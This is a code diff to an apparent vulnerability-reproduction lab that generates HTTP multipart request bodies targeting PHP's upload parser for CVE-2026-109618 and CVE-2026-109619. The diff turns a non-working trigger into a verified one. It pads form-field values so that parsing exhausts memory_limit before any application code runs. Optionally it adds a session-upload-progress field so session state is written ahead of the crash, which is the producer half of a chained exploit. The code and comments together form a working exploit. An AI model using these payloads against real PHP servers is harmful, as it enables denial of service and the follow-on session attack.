@@ -129,8 +129,8 @@ def split_input(body: bytes) -> tuple[int, int]:
 
 # Integrity pins asserted on every build: a run can never carry different
 # input than what was reviewed.
-OOM_BODY_SHA256 = "058e648c1dff45a42c1a7231aad412b98f685e89c809ec9e6fe686fd6bdcd2af"
-OOM_BODY_WITH_PROGRESS_SHA256 = "f3e1c679297bf7bc8c8df378ac95dc25657dd5c2d22506c0723000f785844b28"
+OOM_BODY_SHA256 = "b375e9db58f96410356da678620abe6075e6cc8c8f4cd6307f77b20f5bff1d8b"
+OOM_BODY_WITH_PROGRESS_SHA256 = "ae40ea710dea648d99bb0fdb4347db5714680a10399c8ddbfbf4e2b806d9458a"
 CONSUMER_BODY_SHA256 = "b76da585a6490b758ffa370ea5dbc9174e0fc02fdca948136a9a928784767d11"
 FILE_UPLOAD_BODY_SHA256 = "b21285199292133098d421ed45518317a1f1273f83c99c29454b9b2ef553631e"
 PROGRESS_URLENCODED_FIELD_BODY_SHA256 = "ea9231d3efecd59c3a636abb2380cc03700e9be497b14ad0f50f7a2109600dae"
@@ -140,28 +140,38 @@ PHP_ADMIN_BODY_SHA256 = "3194bdce84add143cc2548fa21cb89116a8ec89bf16327a8b22cb7d
 
 _BOUNDARY = b"mockforge2026lab"
 BOUNDARY = "mockforge2026lab"
-# ~100 parts x ~200 KB of part-header padding crosses the reviewed 16M
-# memory_limit while staying under the pack's 48 MiB forwarding bound; part
-# filenames also push past the configured max_file_uploads, the advisory's
-# third exhaustion route.
+# ~100 parts x ~200 KB of form-FIELD VALUE padding crosses the reviewed 16M
+# memory_limit while staying under the pack's 48 MiB forwarding bound. The
+# padding is each part's VALUE (a form field, no filename), because that is
+# the only placement PHP's rfc1867 multipart parser accumulates into the
+# request's $_POST symbol table (zend heap) during input parsing - the
+# allocation that trips `memory_limit` and takes the OOM bail-out the
+# advisory names. Custom part-header bytes are not retained, and file-upload
+# bodies stream to disk (upload_tmp_dir), so neither counts against
+# memory_limit; an earlier header-padding form therefore parsed cleanly to
+# `200 upload processed` and never reached the bail-out (see issue #1620).
 _PARTS = 100
 _PADDING_PER_PART = 200_000
 _UPLOAD_PROGRESS_FIELD = b"PHP_SESSION_UPLOAD_PROGRESS"
 
 
 def _part(index: int, padding: bytes, with_progress: bool = False) -> bytes:
-    disposition = (
-        f'Content-Disposition: form-data; name="labfield{index}"; '
-        f'filename="labfile{index}.bin"\r\n'
-    ).encode()
-    part = b"--" + _BOUNDARY + b"\r\n" + disposition
+    part = b"--" + _BOUNDARY + b"\r\n"
     if with_progress and index == 0:
+        # A session-upload-progress field published before the OOM, so the
+        # parse writes worker/session state ahead of the bail-out (the
+        # producer half of CVE-2026-109619). Session upload progress is on by
+        # default and needs no application code.
         part += (
-            f"Content-Disposition: form-data; name=\"{_UPLOAD_PROGRESS_FIELD.decode()}\"\r\n\r\n"
-        ).encode()
-        part += b"mockforge-progress-key\r\n"
-        part += b"--" + _BOUNDARY + b"\r\n" + disposition
-    part += f"X-Lab-Padding-{index}: ".encode() + padding + b"\r\n\r\n"
+            b'Content-Disposition: form-data; name="'
+            + _UPLOAD_PROGRESS_FIELD
+            + b'"\r\n\r\nmockforge-progress-key\r\n'
+            + b"--" + _BOUNDARY + b"\r\n"
+        )
+    disposition = (
+        f'Content-Disposition: form-data; name="labfield{index}"\r\n\r\n'
+    ).encode()
+    part += disposition + padding + b"\r\n"
     return part
 
 
@@ -171,9 +181,12 @@ def _assemble(parts: list, closing: bytes) -> bytes:
 
 
 def oom_body() -> bytes:
-    """Producer body: oversized multipart part headers force an OOM bail-out
+    """Producer body: oversized multipart field values force an OOM bail-out
     during input parsing (the advisory's trigger class for CVE-2026-109618,
-    and the producer half of CVE-2026-109619)."""
+    and the producer half of CVE-2026-109619). Verified on the pinned
+    php:8.4.26-apache image: this body raises `Allowed memory size ...
+    exhausted ... in Unknown on line 0` during the rfc1867 parse, before any
+    application code runs - the OOM bail-out the vulnerability needs."""
     padding = b"A" * _PADDING_PER_PART
     parts = [_part(index, padding) for index in range(_PARTS)]
     body = _assemble(parts, b"--" + _BOUNDARY + b"--\r\n")
@@ -183,8 +196,8 @@ def oom_body() -> bytes:
 
 
 def oom_body_with_progress() -> bytes:
-    """Producer body for the same-worker pack: identical memory pressure,
-    with a session-upload-progress field active so the parse writes
+    """Producer body for the same-worker pack: identical field-value memory
+    pressure, with a session-upload-progress field active so the parse writes
     session state before the OOM (the advisory's producer for the
     session-lifecycle consumer path)."""
     padding = b"A" * _PADDING_PER_PART
